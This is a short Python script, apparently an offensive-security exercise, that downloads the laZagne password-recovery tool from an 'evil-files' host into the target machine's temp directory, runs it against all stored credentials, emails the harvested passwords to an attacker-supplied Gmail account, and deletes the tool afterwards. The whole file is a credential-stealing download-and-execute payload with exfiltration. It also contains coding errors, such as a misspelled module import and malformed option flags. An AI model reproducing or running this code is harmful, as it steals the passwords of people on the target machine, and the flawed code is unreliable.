#!/usr/bin/python
'''
python download_and_exeucute.py -e test@gmail.com -p pwd1234
'''

import requests, subprocess, stmplib, re, optparse, os, tempfile

#
#
def download(url):

	get_response = requests.get(url)
	file_name = url.split("/")

	# Open a file, binary(b).
	with open(file_name[-1], "wb") as out_file:
		out_file.write(get_response.content)
#
#
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("e", "--email", dest="usr_email", help="Email generator.")
	parser.add_option("p", "--pwd", dest="usr_pwd", help="Email generator")

	(options, argument) = parser.parse_args()

	if not options.usr_email:
		parser.error("[+] Please specify an email, use --help for more info"):
	elif not options.usr_pwd:
		parser.error("[-] Please specify password, use --help for more info.")

	return options
#
#
def send_mail(email, password, message):
	# Create an instance of an smtp server
	server = smtplib.SMTP("smtp.gmail.com", 587)

	# Initiate a TLS connection
	server.starttls()

	server.login(email, password)
	server.sendmail(email, email, message)

	server.quit()

 
# Module tempfile and method gettempdir() will return the temp directory of the target machine
# Using python class os and chdir() method we navigate to the temp directory. 
# This is cross platform compatible unlike cmd line
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# Download and Execute laZagne.exe
download("http://10.x.x.xx/evil-files/laZagne.exe")

# Generate and send email with target machine pwd.
options = get_arguments()
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(options.usr_email, options.usr_pwd, result)

# Delete laZagne.exe from the temp directory of the target machine
os.remove("laZagne.exe")


